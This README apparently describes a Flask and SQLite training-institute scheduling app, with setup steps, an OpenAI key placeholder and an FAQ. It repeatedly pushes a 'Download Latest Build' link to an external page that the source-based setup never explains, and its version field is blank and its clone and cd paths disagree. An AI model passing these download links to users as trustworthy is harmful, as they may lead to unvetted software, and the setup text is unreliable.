# AI Batch Planner v— - Training Institute Management System 2026

> **AI Batch Planner is a browser-based training operations platform for coordinating courses, batches, trainers, students, timetables, attendance, assessments, and reporting through AI-supported planning tools.**

[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-not--specified-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/caleb-fisherffmb8640/ai-batch-planner-2026?style=flat-square)](https://github.com/caleb-fisherffmb8640/ai-batch-planner-2026)

---

<p align="center">
  <a href="https://caleb-fisherffmb8640.github.io/ai-batch-planner-2026/">
    <img src="https://img.shields.io/badge/Download-AI%20Batch%20Planner%20Latest-brightgreen?style=for-the-badge" alt="Download AI Batch Planner">
  </a>
</p>

> **[Download AI Batch Planner](https://caleb-fisherffmb8640.github.io/ai-batch-planner-2026/)**

---

[Download Latest Build](https://caleb-fisherffmb8640.github.io/ai-batch-planner-2026/)

---

## Overview

AI Batch Planner consolidates the day-to-day functions of a training institute in a single web application. It provides a shared place to organize trainers, courses, batches, enrollments, attendance, assessments, schedules, and student progress.

Alongside standard administration tools, the system offers AI-assisted planning workflows. Teams can seek trainer suggestions, investigate predicted availability, submit questions in natural language, and view explanations for proposed schedules while monitoring operational results.

---

## What It Provides

- Store trainer details, including skills, availability, leave, and workload.
- Set up courses and arrange their associated training batches.
- Register students, place them in batches, and monitor their progress.
- Create batch timetables and assign trainers according to operational requirements.
- Capture daily attendance and prepare monthly attendance summaries.
- Track assessments, performance information, and review actions.
- Produce reports covering trainer utilization and training operations.
- Apply AI assistance to batch planning, trainer selection, availability forecasting, natural-language questions, and schedule explanations.

---

## Getting Started

First, retrieve the repository and move into the application directory:

```bash
git clone https://github.com/caleb-fisherffmb8640/ai-batch-planner-2026.git
cd ai-batch-planner
```

Set up a Python virtual environment and install the required packages:

```bash
python -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
```

For Windows PowerShell, activate the environment with:

```powershell
.venv\Scripts\Activate.ps1
```

Launch the Flask server from the project entry point:

```bash
flask run
```

Once Flask starts, visit the local URL displayed in the terminal.

---

## Operating the Application

The following sequence represents a common institute-management workflow:

1. Create trainer records with their skills, availability, leave, and workload details.
2. Add courses and configure the batches connected to them.
3. Enroll students and place each student in the relevant batch.
4. Prepare session schedules and assign available trainers.
5. Enter attendance information and maintain student progress.
6. Record assessments and performance reviews.
7. Use AI planning tools or natural-language requests to investigate scheduling choices.
8. Consult attendance, utilization, and broader operations reports.

To run the application during local development:

```bash
flask run
```

Use the local address printed by Flask to open the running application.

---

## Environment Setup

AI-powered functions may depend on an OpenAI API key provided through the environment:

```bash
export OPENAI_API_KEY="your-api-key"
```

Windows PowerShell users can set it with:

```powershell
$env:OPENAI_API_KEY = "your-api-key"
```

The application uses SQLite as its data store. Environment-specific settings should remain outside committed source files and be supplied through the configuration method used by the deployment setup.

---

## System Requirements

- A web-capable runtime environment.
- Python with Flask support.
- SQLite for storing application data.
- OpenAI configuration for functionality that connects to OpenAI services.
- A browser for accessing the running Flask application.
- Adequate local storage for application files and the SQLite database.

---

## Frequently Asked Questions

### What organizations can use AI Batch Planner?

The system is designed for training institutes and teams responsible for managing courses, batches, trainers, students, schedules, attendance, assessments, and operational reports.

### Can trainer availability be recorded?

Yes. Trainer profiles support skills, availability, leave, and workload information, which can be used in scheduling and utilization processes.

### What do the AI functions do?

The AI tools assist with batch planning, trainer recommendations, availability prediction, natural-language queries, and schedule explanations. OpenAI configuration may be needed to use these capabilities.

### How should runtime settings be supplied?

Use the environment configuration supported by the application. AI integrations generally read the `OPENAI_API_KEY` environment variable.

### What can I do when the app fails to launch?

Check that the virtual environment has been activated, dependencies have been installed, the Flask entry point is correctly configured, and all required environment values are present. The terminal output should identify the specific startup problem.

### How should the application be updated?

Pull the newest changes from the repository, reinstall or refresh dependencies when necessary, and follow any setup or migration instructions included with the new build.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
